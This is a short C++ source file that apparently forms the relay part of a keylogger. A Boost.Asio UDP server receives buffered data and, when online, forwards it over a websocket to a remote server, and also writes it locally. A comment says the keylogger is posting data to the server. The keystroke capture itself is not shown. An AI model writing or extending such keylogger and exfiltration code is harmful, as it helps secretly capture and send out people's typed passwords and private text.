#include "key_logger.h"

void UdpServer::receive()
{
  socket_.async_receive_from(
    boost::asio::buffer(recv_buffer_),
    remote_endpoint_,
    boost::bind(&UdpServer::handleReceive, this, boost::asio::placeholders::error, boost::asio::placeholders::bytes_transferred));
}

void UdpServer::handleReceive(const boost::system::error_code& error, std::size_t)
{
  if (!error || error == boost::asio::error::message_size)
  {  
    if(online)
    {
      //std::cout << "Keylogger posting data to the server" << std::endl;
      io.post( [this]() {
        websocket_.writeData(std::string((char*)&recv_buffer_));
      });
    }

    websocket_.writeLocal(std::string((char*)&recv_buffer_));

    if(!to_stop)
      receive();
  }
}

void keyLogger(DataWriter & websocket, int session, boost::asio::io_service & io_service)
{
  try
  {
    UdpServer server(io_service, websocket);
    io_service.run();
  }
  catch (std::exception& e){
    std::cerr << e.what() << std::endl;
  }
}